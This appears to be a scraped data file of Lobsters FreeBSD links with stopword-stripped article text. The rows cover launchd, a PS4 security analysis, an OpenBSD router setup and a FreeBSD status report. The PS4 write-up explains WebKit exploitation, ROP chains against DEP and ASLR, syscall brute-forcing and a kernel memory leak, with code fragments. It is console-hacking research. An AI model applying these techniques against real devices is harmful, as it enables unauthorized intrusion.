587,Lobsters,freebsd,FreeBSD,Why FreeBSD should not adopt launchd,http://blog.darknedgy.net/technology/2015/08/26/0/,freebsd adopt launchd,freebsd adopt launchd disclaimer preface freebsd next year talk featuring jordan hubbard kip macy launchd chimera architecture buzzword idea socket activation encourages daemon writer link liblaunch one reportedly play well actual crond mach anachronism welcome nextbsd neither darwin bsd freebsd adopt instead nosh svc conclusion comment,freebsd adopt launchd vr disclaimer firstly visceral nature discussion would like add disclaimer article borne ludditism quite contrary shall see importantly oppose machlibsystemlaunchd integration inside derivative product freebsd freenas pcbsd strictly freebsd skeptical goal nextbsd project led ixsystems pushing o xification effort preface keeping eye nextbsd time initially openlaunchd effort initially started r tyler gsoc student unsurprisingly port launchd system service manager freebsd stalled long time revival late moving slowly around november meetbsd conference jordan hubbard delivered talk entitled freebsd next year outlined general desire eventdriven unified configuration approach freebsd strongly implying use launchd system bootstrap service daemon well part o x lowlevel userspace time lot people including considered hypothetical true ongoing effort certainly kept low profile however growing research interest gnu hurd quickly reminded openlaunchd effort went ask kip macy status mach ipc port freebsd turned ported partial osf mach implementation also apple system logger xpc libdispatch libnotify libaudit launchd json parser point realized thing gotten real soon project officially unveiled bay area freebsd user group meeting august talk featuring jordan hubbard kip macy brings article believe misguided though nothing wrong experimentation attempt persuade reader launchd mach good fit freebsd launchd chimera architecture gist launchd architecture specific o x particular use case trying verbatim port another system lead conceptual mismatch context o x launchd among thing mach bootstrap server managing namespace nameport binding discovery purpose among mach service since mach port namespaces internal task central arbiter chosen handle lookup service registration important note mean necessity instance gnu hurd equivalent bootstrap server instead process assigned bootstrap port rendezvous server library start bootstrapping therefore decentralized activity nextbsd developer instead largely think mach semantics regard o x specifically implement rather general proceed infer extrapolate specific architecture fiat launchd probably first system popularize buzzword idea socket activation really rebranding age old idea fdpassing inetdstyle service launching generic scheme like ucspi adhoc centrally managed protocol fully exploit encourages daemon writer link liblaunch creating undesirable lockin however core blot launchd absolutely muddy confused semantics categorizing service launchd designed start supervise daemon socalled agent really perusersession daemon mach service xpc service right bat latter two o xspecific bound ipc mechanism inconsistent way categorize service agent one four session type prelogin peruser gui session nongui session notice idea gui prelogin session type quite clearly designed aqua interface loginwindow application o xspecific display manager mind irrelevant impedance mismatch platform idea nongui session agent tightly coupled launchd start sshd plist peculiarly limited domain devote entire agent type complicating thing actual process type documented launchdplist even something like systemd treat information startup routine performed tightly coupled scheduling policy resource limit applied four type ambiguously named background standard adaptive interactive background straightforward regular service daemonized automatic resource limiting standard implicit default adaptive switch background interactive using xpc process type coupled particular way using ipc mechanism interactive quite confusingly one without resource limit might baffled quagmire well make decent sense desktop want good priority scheduling resource accounting application kept responsive even system event queue server embedded system freebsd primarily used absolutely nonsensical behavior even well observable moreover launchd largely limited one startup discipline lazy loading service demand example something like daemontools based philosophy let crash restarting service continuously dependency met low overhead versatility used standard eager service manager boot everything also made lazy use simple socket toolkit interface similar inetd much modular like ucspi systemd used lazy eager fashion achieving via complicated dependency system launchd though handle eagerness particularly well formal dependency ordering system fit well let crash paradigm either fact quoting creating launch daemon agent play well nonlaunchd daemon general daemon dependency nonlaunchd daemon must take additional care ensure daemon work correctly nonlaunchd daemon started daemon started best way include loop start time check see nonlaunchd daemon running sleep several second checking sure set handler sigterm prior loop ensure able properly shut daemon rely never becomes available help get around launchd provides hack form keepalive key bind service uptime particular resource condition option suffer intrinsic race condition networkstate bind network interface defined least one nonloopback interface address assigned pathstate keeping alive long inode given path exists raciness come file system event notification laughably otherjobenabled right couple job another job enabled label poor man dependency system ripe abuse completely subverts whole supposed point launchd existence begin course top oneshot job key named launchonlyonce opposed sort type would make sense crondlike functionality startcalendarinterval reportedly play well actual crond ambiguous resource balancing key like limitloadto lowpriorityio ability yield debugger first via waitfordebugger mean launchd break ptrace semantics hope let neglect service state meshed global system state instead isolated different process different responsibility way everything described pid reliability concern matter way slice might fine desktop system generic slightest another reliability concern configuration parsing done pid apple launchd format xml nextbsd launchd bit saner chose json instead general parsing probably handled outside critical base pid since parser long notorious source bug particularly adept input fuzzing ultimately launchd architecture mess layering violation semantic inconsistency odd ambiguous interface make really awkward use emerges fact try manager every unit cpu time whole damned system clearly highly specifically tailored tool o x constraint designed mostly developerfacing shaping desktop experience rather something sysadmin would heavily use fine o x clumsy fine freebsd really much anything else mach anachronism jordan hubbard claim grand impedance mismatch mach unix concept contest nextbsdorg welcome nextbsd post make following statement hope progressive willing try new thing fear changing startup system dragging unix kicking screaming century hair necessary help laugh going drag unix kicking screaming integrating firstgeneration research microkernel infamous ipc keep mind bashing mach per se gnu hurd fine gnu mach even done interesting refactoring update throughout year sure o x fine mach xnu well ipc used extensively consciously adopting interface baffling anachronism especially project priding futurism vision course osf mach interface mklinux shimmed mostly mean getting o x system stuff try justify merit decision would best userland mach server however impractical mach semantics fact really tricky pin monolithic unix even kernel module support memory object backed store external pager ie userspace page fault handler monolithic unix never good mechanism achieving old hack trapping sigsegv eg gnu libsigsegv limited userfaultfd mechanism proposed linux inspired work kvm yet merged mach enforces strict taskthread dichotomy ie dichotomy virtual address space unit cpu time running together combined form process freebsd case shortcut ugly fashion assuming task process thread kthread violates proper mach semantics would probably need done linux way mach vm system appears well ported mach vmread vmwrite function work mapping discrete task address space likely motivator making kernel module still reliability concern nextbsd slide praise mach ipc facilitating separate service namespaces file system huge disadvantage using plan inferno taught perprocess namespaces much elegant versatile table integer descriptor port namespace mention preexisting welldefined rpc interface presume reference mig mig compiler translates rpc definition language called matchmaker elaborate c code packing mach message particularly pleasant use mostly side effect mach ipc grueling use hence apple made xpc best knowledge never used implement location transparent communication neither darwin bsd boil nextbsd effort barely even trying think solving problem people associated apple enamored o x technology simply ritualistically port o x infrastructure inherently correct fiat need justification want dynamic system course gon na port launchd want nice indexed logging course gon na port asl hey need mach xpc let put partial osf mach kernel module address space big question use o x instead think reason nextbsd effort stand intention anything interesting o xisms using directly upstream intended thus position play eternal catchup darwin want use darwin directly run something like puredarwin want whole shebang use o x already reasonably interoperable unix licensed unix fact nextbsd profound example ageold joke something must done something therefore must nextbsd project severe identity crisis freebsd adopt instead three practical option name one use nosh highly flexible modular system service management toolkit made jonathan de boyne pollard implement lot systemd launchdlike feature yet architecture polar opposite run freebsd rcd script even ported second follow dragonfly bsd example matthew dillon wrote small yet powerful service manager called svc us jail service tracking isolation plus proctl system call becoming reaper without init similar prsetchildsubreaper flag linux prctl though otherwise rudimentary goal would write simple yet complete versatile service manager exploit native freebsd feature third nothing stick rcd comment pretty selfexplanatory conclusion identified structural technical issue launchd architecture mach concept map well monolithic unix general folly secondfiddle o x instead exploiting native feature building top existing structure rather hacky verbatim porting foreign system software hope post interesting reading comment
589,Lobsters,freebsd,FreeBSD,Analysis of PS4's security and the state of hacking,http://cturt.github.io/ps4.html,analysis security state hacking,hacking part introduction security userland rop analysis kernel heap overflow introduction exploiting d game stack smash vulnerability save file pup file update via usb background information software used open source mono vm webkit webkit entry point writeups port exploit using vulnerability originally written mac o x safari internet browser vulnerability found webkit rop d data execution prevention dep returnoriented programming rop turingcomplete finding gadget rp general protection fault segmentation fault aslr address space layout randomization aslr old firmware nt aslr enabled complete list module available justrop justrop javascript caveat system call calling convention linux msdos system call getpid getpid void security obscurity list system call kernel pid randomisation hardenedbsd many custom system call last standard freebsd system call libkernelsprx thrinitc reversing module dump analyse system call brute forcing system call system call dumping additional module psdevwiki browsing filesystem exist sandboxing system call number open source software used capsicum freebsd jail jail freebsd kernel exploit freebsd kernel source code kernel vulnerability already found smaller vulnerabilites getlogin getlogin system call leak small amount kernel memory yifanlu claim kernel aslr summary kernel configuration jaicrab discovered two uart port like dsi geohot original hypervisor hack thanks,hacking part introduction security userland rop initial publication june note article part part series see also analysis sysdynlibpreparedlclose kernel heap overflow introduction since nt major public announcement regarding hacking long time wanted explain bit far hacking come preventing progression explain security concept generally apply modern system discovery made running rop test goal series present full chain exploit ultimately gain kernel code execution visiting web page internet browser particularly familiar exploitation read article exploiting d game stack smash vulnerability save file first may download complete setup run test currently firmware older firmware wish update may download pup file update via usb background information probably know feature custom amd cpu core load research available cpu architecture even specific version might deviate slightly known standard example pfla page fault liberation army released proof concept implementing complete turing machine using page fault mmu congress check awesome video youtube also interesting trying run code within virtual machine want execute instruction host cpu well well documented cpu architecture much software used open source notably orbis o based freebsd like o part netbsd well includes wide variety additional open source software well mono vm webkit webkit entry point webkit open source layout engine render web page browser io wii u p vita although widely used mature webkit share vulnerability learn many reading writeups particular browser firmware us version webkit vulnerable heapbased buffer overflow jsarray sort method na proxima announced successfully able port exploit using vulnerability originally written mac o x safari internet browser released poc code publicly first entry point hacking give u arbitrary read write access everything webkit process read write used dump module overwrite return address stack letting u control instruction pointer register rip achieve rop execution since many vulnerability found webkit could probably used entry point later firmware writing one ported exploit publicly never signed psn wo nt able open internet browser however go setting user guide open limited web browser view control content proxy rop unlike primitive device like d kernel control property different area memory page memory marked executable overwritten page memory marked writable executed known data execution prevention dep mean ca nt copy payload memory execute however execute code already loaded memory marked executable would nt useful jump single address ca nt write code address use rop returnoriented programming rop extension traditional stack smashing instead overwriting single value rip jump chain together many different address known gadget gadget usually single desired instruction followed ret assembly ret instruction reached bit value popped stack rip jump since control stack make every ret instruction jump next desired gadget example may contains instruction mov rax ret may contain instruction mov rbx ret overwrite return address stack contain followed soon first ret instruction reached execution jump mov rax immediately afterwards next ret instruction pop stack jump mov rbx effectively chain set rax rbx written code single location executed rop chain nt limited list address though assuming contains instruction pop rax ret set first item chain next item desired value rax gadget also nt end ret instruction use gadget ending jmp add rax jmp rcx making rcx point ret instruction chain continue normal chainadd pop rcx ret chainadd add rax jmp rcx sometimes wo nt able find exact gadget need instruction example want set something gadget set dummy value pop pop ret although may creative write rop chain generally accepted within sufficiently large enough code dump enough gadget turingcomplete functionality make rop viable method defeating dep finding gadget think rop writing new chapter book using word appeared end sentence previous chapter obvious structure sentence probably wo nt able find word like appearing end sentence need connective order write anything meaningful quite possible however sentence ended sand although author ever intended word read start reading appear entirely different word coincidence principle also apply rop since almost function structured prologue epilogue save register push rbp mov rbp rsp push push push push push rbx sub rsp function body restore register add rsp pop rbx pop pop pop pop pop rbp ret expect able find pop gadget rarely something like xor rax rax set return value returning comparison like cmp rax ret would nt make sense since result comparison nt used function however still possibility find gadget like instruction similar word variable length mean something entirely different depending decoding start architecture variablelength cisc instruction set returnoriented programming take advantage fact instruction set dense random sequence byte likely interpretable valid set instruction demonstrate take look end function webkit module mov eax mov eax byte ptr ret take look code look like start decoding cmp rax ret even though code never intended executed within area memory marked executable perfectly valid use gadget course would incredibily time consuming look every possible way interpreting code every single ret instruction manually tool exist one use search rop gadget rp generate text file filled gadget use f unique general protection fault perform access violation trying execute nonexecutable page memory trying write nonwritable page memory general protection fault specifically instance segmentation fault occur example trying execute code stack mapped read write chaindata chaindata chainadd chaindata trying write code mapped read execute modulebases webkit general protection fault occurs message saying enough free system memory appear page fail load message also displayed hard fault division execution invalid instruction unimplemented system call commonly encountered performing segmentation fault aslr address space layout randomization aslr security technique cause base address module different every time start reported old firmware nt aslr enabled introduced sometime firmware note kernel aslr enabled firmware lower least proved later article exploit aslr would problem nt know address gadget memory would idea write stack luckily u nt limited writing static rop chain use javascript read module table tell u base address loaded module using base calculate address gadget trigger rop execution defeating aslr module table also includes filename module webprocessself libkernelsprx libscelibcinternalsprx libscesysmodulesprx libscenetsprx libscenetctlsprx libsceipmisprx libscembussprx libsceregmgrsprx libscertcsprx libscepadsprx libscevideooutsprx libsceorbiscompatsprx libscesyscoresprx libscesslsprx libscevideocoreserverinterfacesprx libscesystemservicesprx libscecompositeextsprx although predominantly us signed ppu relocatable executable prx format module string reference signed executable linking format elf object file also found libscesysmodulesprx dump bdjelf webcoreelf orbisjsccompilerself combination module object similar used psp view complete list module available loaded browser libscesysmodulesprx load dump several sony custom system call explained later article justrop using javascript write execute dynamic rop chain give u tremendous advantage traditional static buffer overflow attack well necessary defeat aslr javascript also let u read user agent browser provide different rop chain different browser version giving exploit greater range compatibility even use javascript read memory gadget address check correct giving u almost perfect reliability theoretically could take even writing script dynamically find rop gadget build rop chain fly writing rop chain dynamically rather generating script beforehand make sense created javascript framework writing rop chain justrop reason javascript caveat javascript represents number using doubleprecision bit format provides u bit precision meaning nt possible represent every bit value approximation used need set bit value something low like fine situation need write buffer struct data possibility certain byte written incorrectly written bit chunk instead write data bit chunk remembering little endian ensure every byte exact system call interestingly us calling convention linux msdos system call argument stored register rather traditional unix way freebsd us default argument stored stack rax system call number rdi argument rsi argument rdx argument argument argument argument try perform system call following justrop method thissyscall function name systemcallnumber consolelog syscall name thisadd pop rax systemcallnumber typeof undefined thisadd pop rdi typeof undefined thisadd pop rsi typeof undefined thisadd pop rdx typeof undefined thisadd pop rcx typeof undefined thisadd pop typeof undefined thisadd pop thisadd mov rcx syscall make sure set stack base free memory beforehand thisadd pop rbp stackbase returnaddress using system call tell u huge amount kernel using system call likely way interact kernel thus potentially trigger kernel exploit reverse engineering module identify sony custom system call may come across alternative calling convention sometimes sony performs system call regular system call usually nothing freebsd first argument rdi controlling system call executed rax rdi system call number rsi argument rdx argument argument argument argument likely sony easy compatibility function calling convention example global syscall syscall xor rax rax mov rcx syscall ret using perform system call c using function calling convention int syscall int getpid void return syscall writing rop chain use either convention get current process id chainsyscall getpid chainsyscall getpid good aware use whichever one convenient gadget available getpid using system call getpid void learn lot kernel fact system call work tell u sony nt bother mixing system call number mean security obscurity bsd license could done without releasing new system call number automatically list system call kernel try secondly calling getpid restarting browser calling get return value higher previous value tell u internet browser app actually consists separate process webkit core take handle parsing html cs decoding image executing javascript example another one handle everything else displaying graphic receiving controller input managing history bookmark etc also although freebsd supported pid randomisation since sequential pid allocation default behaviour fact pid allocation set default behaviour indicates sony likely nt bother adding additional security enhancement encouraged project like hardenedbsd userland aslr many custom system call last standard freebsd system call number anything higher must custom sony system call invoking sony custom system call without correct argument return error invalid argument however compatibility unimplemented system call report enough free system memory error trial error found system call number last sony system call anything higher unimplemented conclude custom sony system call kernel libkernelsprx identify custom system call used libkernel must first remember modification standard freebsd library extract libpthreadinit thrinitc check special case process running place init pid thrpid getpid setup new session process assumed running root setsid panic ca nt set session id revoke pathconsole panic ca nt revoke console fd sysopen pathconsole ordwr panic ca nt open console setlogin root panic ca nt set login root ioctl fd tiocsctty char null panic ca nt set controlling terminal function found offset libkernelsprx extract look within libkernel dump call getpid mov c eax cmp eax jnz short call setsid cmp eax jz lea rdi adevconsole devconsole call revoke test eax eax jnz lea rdi adevconsole devconsole mov esi xor al al call open mov eax test j lea rdi aroot root call setlogin cmp eax jz mov edi mov esi xor edx edx xor al al call ioctl cmp eax jz reversing module dump analyse system call libkernel nt completely open source though also lot custom code help disclose sony system call although process vary depending system call looking fairly easy get basic understanding argument passed system call wrapper declared somewhere libkernelsprx almost always follow template proc near mov rax mov rcx syscall jb short error retn error lea rcx jmp rcx endp note mov rcx instruction nt necessarily mean system call take least argument system call wrapper even take argument getpid found wrapper look xrefs mov edi xor esi esi mov edx call test eax eax jz short good look several make sure register nt modified something unrelated mov edi xor esi esi xor edx edx call test eax eax jz short consistently first three register system call convention rdi rsi rdx modified invoking call conclude reasonable confidence take argument clarity would replicate call justrop chainsyscall unknown chainsyscall unknown system call return success seen jz conditional testing return value looking anything beyond amount argument require much indepth analysis code call understand context help get started brute forcing system call although reverse engineering module dump reliable way identify system call nt referenced dump need analyse blindly guess certain system call might take particular set argument brute force system call return certain value success argument chose ignore returned error also pas argument brute force system call return useful error bad address would indicate take least one pointer firstly need execute rop chain soon page load attaching function body element onload body onload exploit next need perform specific system call depending http get value although done javascript demonstrate using php simplicity var sony chainsyscall sony system call sony php print get b chainwriteraxtovariable system call executed check return value nt interesting redirect page next system call chaingetvariable windowlocationassign indexphp b php print get b tostring running page appended end start brute force first sony system call although method requires lot experimentation passing different value system call found brute forcing analysing new return value system call able partially identify system call example take look system call without relying module dump return value depending passed first argument invalid argument bad address pointer initially time page refreshed value increase potential argument try would pid thread id file descriptor although system call return success due nature return value increasing time called seems like allocating resource number file descriptor next thing would look data performing system call see written since change data assume input tried passing long string first argument always try every input find possibility discovering buffer overflow writestring chaindata aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa chainsyscall unknown chaindata return value enametoolong unfortunately seems system call correctly limit name byte including null truncator tell u expecting string rather struct possibility system call obvious something related filesystem custom mkdir open nt seem particularly likely seeing resource allocated even wrote data pointer test whether first parameter path break multiple character see allows longer string writestring chaindata aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa chainsyscall unknown chaindata since also return assume first argument nt path name something get allocated sequential identifier analysing system call found following shared exact behaviour information far almost impossible pinpoint exactly system call run test information slowly revealed save time system call allocating event flag nt take name using general knowledge kernel work guess verify system call allocating semaphore mutexes etc dumping additional module dump additional module following stage load module get module base address dump module extracted posted list module name psdevwiki load module need use scesysmoduleloadmodule function libscesysmodulesprx first parameter module id load passed following justrop method used perform function call thiscall function name module address consolelog call name typeof undefined thisadd pop rdi typeof undefined thisadd pop rsi typeof undefined thisadd pop rdx typeof undefined thisadd pop rcx typeof undefined thisadd pop typeof undefined thisadd pop thisadd modulebases module address load libsceavsettingsprx chaincall scesysmoduleloadmodule libsysmodule unfortunately fault triggered trying load certain module scesysmoduleloadmodule function nt load dependency need manually load first like system call return success see loaded module id allocated use one sony custom system call number get list currently loaded module var countaddress chaindata var modulesaddress chaindata system call getloadedmodules int destinationmodulehandles int max int count chainsyscall getloadedmodules modulesaddress countaddress chainexecute function var count countaddress var index index count index logadd module handle modulesaddress index tostring running without loading additional module produce following list run loading module see additional entry remember module id loaded module handle use another sony custom system call number take module handle buffer fill buffer information loaded module including base address since next available handle always hardcode value chain rather store result module list buffer must start size struct returned otherwise error returned invalid argument moduleinfoaddress chainsyscall getmoduleinfo moduleinfoaddress chainexecute function logadd hexdump moduleinfoaddress return upon success fill buffer struct read like var name readstring moduleinfoaddress var codebase moduleinfoaddress var codesize moduleinfoaddress var database moduleinfoaddress var datasize moduleinfoaddress everything need dump module dump codebase codesize datasize another sony system call number work similar way provides slightly different information loaded module moduleinfoaddress chainsyscall getdifferentmoduleinfo moduleinfoaddress logadd hexdump moduleinfoaddress clear information browsing filesystem us standard freebsd system call reading file directory however whilst using read directory dev work others fail sure use getdents instead read directory work much reliably writestring chaindata dev chainsyscall open chaindata chainwriteraxtovariable chainreadrdifromvariable chainsyscall getdents undefined chaindata resultant memory dipsw null zero fd stdin stdout stderr random urandom decistdout decistd err deci decitty deci decitty deci decistdin bpf hid sce zlib ctty gc dce dbggc ajma uvdb vcee noti f notification p usbc tl v came ra rng usb read device example reading devurandom fill memory random data also possible parse memory create clean list entry look browserhtml repository complete file browser unfortunately due sandboxing nt complete access file system trying read file directory exist restricted give error enoent file directory access lot interesting stuff though including encrypted save data trophy account information go filesystem next article sandboxing well file related system call failing certain path reason system call fail commonly disallowed system call return error eperm operation permitted trying use ptrace system call may fail different reason compatibilty system call disabled trying call mmap example must use system call number otherwise segfault triggered system call exit also trigger fault chainsyscall exit trying create sctp socket return error eprotonosupport indicating sctp socket disabled kernel int socket int domain int type int protocol socket afinet sockstream ipprotosctp chainsyscall socket although calling mmap protread protwrite protexec return valid pointer protexec flag ignored reading protection return rw attempt execute memory trigger segfault chainsyscall mmap chainwriteraxtovariable chainreadrdifromvariable chainadd pop rax chainadd mov rdi rax chainadd mov rax rdi chainadd jmp rax list open source software used nt list kind sandboxing software like capsicum must use either pure freebsd jail kind custom proprietary sandboxing system unlikely jail prove existence freebsd jail actively used kernel auditon system call impossible execute within jailed environment chainsyscall auditon first thing auditon system call check jailed return enosys jailed td tducred return enosys otherwise system call would likely return eperm macsystemcheckauditon error macsystemcheckauditon td tducred uap cmd error return error privcheck error privcheck td privauditcontrol error return error absolute furthest system call could reach would immediately privcheck returning einval due length argument uap length uap length sizeof union auditonudata return einval since macsystemcheckauditon privcheck never return enosys jailed check pas way enosys could returned executing chain enosys returned tell u whatever sandbox system us least based jail jailed check pass freebsd kernel exploit trying look new vulnerability freebsd kernel source code first check whether kernel vulnerability already found could used immediately dismiss obvious reason however smaller vulnerabilites could lead something getlogin one vulnerability look easy try using getlogin system call leak small amount kernel memory getlogin system call intended copy login name current session userland memory however due bug whole buffer always copied size name string mean read uninitialised data kernel might use note system call actually int getloginr char name int len char getlogin void let try copying kernel memory unused part userland memory chainsyscall getlogin chaindata unfortunately byte data get since login name limited maxlogname sysparamh character currently including null executing chain return value mean system call worked excellent start let take look memory pointed executing chain executing chain fe ff ff ff ff ff ff decoding first byte ascii root browser executed root unexpected interestingly memory leaked look like pointer something kernel always time chain run evidence support yifanlu claim kernel aslr summary information currently available kernel seems similar stock freebsd kernel importantly difference present appear standard kernel configuration change disabling sctp socket rather modified code sony also added several custom system call kernel apart rest kernel seems fairly untouched respect inclined believe share juicy vulnerability freebsd kernel unfortunately kernel exploit triggered webkit entry point currently due sandboxing constraint likely stock freebsd jail freebsd unlikely anyone stashing away private exploit freebsd unless new one suddenly released stuck currently available best approach seems reverse engineering module dumped order document many sony custom system call possible hunch luck targeting standard freebsd system call recently jaicrab discovered two uart port show u hardware hacker interested although role hardware hacker traditionally dump ram system like dsi already thanks webkit exploit also possibility hardware triggered kernel vulnerability found like geohot original hypervisor hack remains likely kernel exploit found system call vulnerability though thanks flatz skfu droogie xerpi bigboss hunger takezo proxima
590,Lobsters,freebsd,FreeBSD,Using OpenBSD as a FreeBSD Router,https://www.quernus.co.uk/2015/07/27/openbsd-as-freebsd-router/,using openbsd freebsd router,freebsd great server freebsd since binary update system openbsd great router netsight started looking openbsd carp freebsd openbsd bhvye someone else already done something similar actual configs conclusion go top,freebsd great server freebsd great o use office fileserver due zfs implementation general robustness fileserver general office server however one thing like freebsd even though ipsec baked many many year still enabled default generic kernel kernel option freebsd loaded loadable module ipsec one using freebsd since used sit leaving running make kernel overnight build new kernel little time day change option required compiling custom kernel frank inclination patience even hardware improvement mean used take hour take minute importantly freebsd binary update system mean interim binary security patch applied without needing compiled kernel get ipsec longer option seemed freebsd update clobber change found updating freebsd office server using freebsdupdate suddenly ipsec vpn home office stopped working openbsd great router whilst netsight started looking using openbsd routing using big cisco switch route switch module provide routing problem soon became quite slow great wanted simple routing could layer switching silicon linecards soon started access list route packet main cpu acl syntax quickly became cumbersome way kind macro variable language openbsd hand come amazing pf packet filter fantastic stateful packet filter extremely fast nice expressive language write firewall rule datacentre soon ended pair box running openbsd firewall configured pf carp provide redundancy two box protected entire datacentre network acted main filter choke point sanitise traffic ensured spoofed packet leaving network customer could quickly easily help protect attack network long replaced cisco router openbsd box turned extremely reliable flexible fast gigabitlevel intravlan routing freebsd openbsd freebsd hypervisor bhvye allowing run freebsd openbsd linux guest virtual machine freebsd host could potentially cake eat could freebsd host run openbsd guest ipsec termination well virtualised router started become quite hot topic increase virtualisation server virtualising number server virtualise networking infrastructure leverage redundancy vm cluster also move network function closer host supporting turn someone else already done something similar using pci passthru allows pas pci device guest control completely able due processor required vtd feature also external network interface actually usb ethernet adapter server hp microserver two built gigabit port wanted use port internal connection one desktop imac one mac mini io build server order passthru pas entire usb hub guest reality would probably issue four different usb hub server could pas usb hub guest keep usb hub host use transferring data tofrom usb stick achieve effect bridging physical interface host virtual interface guest fact got two bridge one representing network one actual configs boot vm script start openbsd vm configures device due needing grub boot need grubbhyve package custom script matt jenna root cat startvmsh cd storagevms grubbhyve storagevmsobsdmap r bhyve h p amdhostbridge lpc virtionet virtioblk devzvolstoragevmsopenbsd virtionet l stdio w matt jenna root cat kopenbsd h r bsd boot bhyve command see configured two virtual ethernet adapter bound host freebsd server manual script run server us geli encrypt main storage zfs array disk server boot boot minimal system none zfs mounted need ssh start zfs array another script supply passphrase decrypt disk zfs array run script start openbsd server get connectivity outside world complete etcrcconf file set networking note also wifi adapter server act base station office phone laptop also two vlans imac high mtu one direct data imac server regular mtu one external data bridging wifi matt jenna root cat etcrcconf configure wifi interface hostap country quernus indoor mode channel configure physcial interface bring vlans link imac netmask mtu mtu create cloned interface configure tap interface openbsd router vm use bring bridge internal facing bridge netmask addm addm addm addm external facing bridge addm route traffic openbsd vm configure service zfs one thing particular note forwarding packet freebsd host root jenna sysctl netinetipforwarding netinetipforwarding routing happening openbsd box let look openbsd router vm firstly see two virtual network interface per bhyve command ran create dmesg grep virtio dev function virtio rev virtio network device address msi dev function virtio rev virtio block device msi dev function virtio rev virtio network device address msi configured two virtual interface one internal ip address one public static external address assigned upstream provider cat inet cat inet cat etcmygate cat etcsysctlconf configured pf nat allow server ssh also allows ipsec traffic home router also run sip proxy allow sip client desktop connect voip provider cat etcpfconf set skip lo set skip intif match extif natto block log pas establish keepstate allow ping etc pas extif proto icmp allow ssh pas extif proto tcp port allow ipsec vpn traffic pas extif proto esp homeip pas allow sip traffic pas extif proto udp port looking output ifconfig see two interface ifconfig loopback running multicast mtu priority group lo prefixlen scopeid prefixlen inet netmask broadcast running promisc allmulti simplex multicast mtu lladdr priority medium ethernet autoselect status active inet net mask broadcast broadcast running promisc allmulti simplex multicast mtu lladdr priority group egress medium ethernet autoselect status active inet net mask broadcast priority group enc status active running promisc mtu priority group pflog actual ipsec setup breeze openbsd detail various place etcipsecconf file shown remote end connection draytek vigor router home ipsecconf ike dynamic esp local peer xxxx main auth enc aes group quick auth enc aes srcid dstid xxxx psk mysecret conclusion week working really well issue stability performance network since able set openbsds fantastic relayd proxy incoming http traffic mac mini build server office point might try pci passthru route new cpu sat desk vtd plug server got around yet bridging route work well also give additional point run tcpdump test anything question let know comment go top
591,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report,https://www.freebsd.org/news/status/report-2015-04-2015-06.html,freebsd quarterly status report,introduction benjamin kaduk warren block clusteradm freebsdorg freebsd release note core freebsdorg http reviewsfreebsdorg shawnwebb hardenedbsdorg oliverpinter hardenedbsdorg core hardenedbsdorg open task grehan freebsdorg neel freebsdorg tychon freebsdorg freebsd allanjudecom mav freebsdorg araujo freebsdorg open task http githubcomallanjudebhyveucl allanjude freebsdorg dchagin freebsdorg emaste freebsdorg trasz freebsdorg xmj freebsdorg emulation freebsdorg open task maxg mellanoxcom sagig mellanoxcom njwilliams swineduau open task rwatson freebsdorg brueffer freebsdorg trustedbsdaudit trustedbsdorg open task franco opnsenseorg ad opnsenseorg jos opnsenseorg trasz freebsdorg open task submesa gmailcom imp freebsdorg open task jmg freebsdorg open task ed freebsdorg project github develcloudabitoolchain sysutilscloudabiutils open task kib freebsdorg kib freebsdorg imp freebsdorg open task der semihalfcom wma semihalfcom mst semihalfcom zbb semihalfcom open task andrew freebsdorg emaste freebsdorg br freebsdorg open task bapt freebsdorg rootdir open task kde freebsdorg open task bdrewery freebsdorg portmgr freebsdorg sbruno freebsdorg pkgstatusfreebsdorg bsdcan presentation open task http portmgrsecretary freebsdorg portmgr freebsdorg open task freebsdorg open task gerald freebsdorg dbn freebsdorg open task wine wiki wiki xfce freebsdorg pr open task pr freebsddoc freebsdorg open task mwlucas michaelwlucascom wblock freebsdorg open task doceng freebsdorg bhd freebsdorg jkois freebsdorg bcr freebsdorg open task pfg freebsdorg op freebsdorg open task btw freebsdorg hiren freebsdorg dvl freebsdorg video reimplementing netbsd using microkernel geeklancouk release pkg support pkgsrc open task deb freebsdfoundationorg linuxfest northwest trip trademark usage term condition metricspacenet open task news home status home,introductionthe second quarter april june another period busy activity freebsd report largest published farthe cluster release engineering team continued improve structure support freebsd build maintenance installation project ran gamut security speed improvement virtualization storage appliance new kernel driver capability added work make freebsd run various arm architecture continued rapid pace port collection grew even adding capability fixing problem outside project like pkgsrc become interested adding support documentation major focus one often complimented people new freebsd bsdcan great success turning many hour sleep deprivation even greater amount inspirationas always great deal activity directly sponsored foundation project status firstclass operating system owes great deal foundation past ongoing workthe number detail report really give tiny glimpse happening huge portion freebsd development take place time including bug fix feature improvement rewrite import new code ongoing work difficult timeconsuming far often unrecognized take moment consider thank contributor listed also end user bug submitter port maintainer coder security analyst infrastructure defender tinkerer scientist designer questioner answerer rule maker tester documenters sysadmins dogmatist iconoclast crazed genius make freebsd effective useful operating system reading one people thank blockthis status report compiled benjamin kaduk warren block please submit status report third quarter july september october contact freebsd cluster administration team clusteradm freebsd cluster administration team consists people responsible administering machine project relies distributed work communication synchronised quarter team extremely busy work visible invisible outside freebsd infrastructure migrated reference machine used freebsd developer new machine purchased freebsd foundation new york internet separated email service singlepointoffailure case machine handling task year new singlepurpose service installation reorganized infrastructure serving repository hosted svnfreebsdorg geodnsbacked mirror single official ssl certificate increased multisite redundancy public nonpublic service throughout present eight worldwide geographic site enormous amount work volunteerdriven resource time hardware generously provided freebsd foundation project sponsored freebsd foundation time hardware contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd cycle began midjune final release expected available late august quarterly status update show freebsd going exciting release freebsd release engineering team extremely busy quarter much focus targeted adding support additional hardware integration thirdparty hosting provider aka cloud hosting following work done andrew turner port freebsd architecture release engineering build tool updated produce memory stick image virtual machine image use qemu emulatorsqemudevel present qemu virtual machine image require external efi file boot detail boot virtual machine image available linked freebsd development snapshot announcement email archive last quarter several part build tool rewritten allow greater extensibility granularity simplified code required new virtual machine image collaboration several developer release engineering build tool updated provide new support several hosting provider well provide mechanism automatically upload publish possible freebsd virtual machine image quarter addition existing support microsoft azure platform build tool also natively support amazon thanks colin percival google compute engine thanks steve will vagranthashicorp atlas thanks brad davis freebsd release engineering team would like thank developer work went making possible would like especially thank marcel moolenaar work mkimg utility especially adding support various file format requested addition enhancement virtual machine build tool significant amount work went refactoring build code used produce freebsdarm image much logic resembling crochet utility written tim kientzle work significant amount work input advice ian lepore warner losh andrew turner luiz otavio souza large number contributor 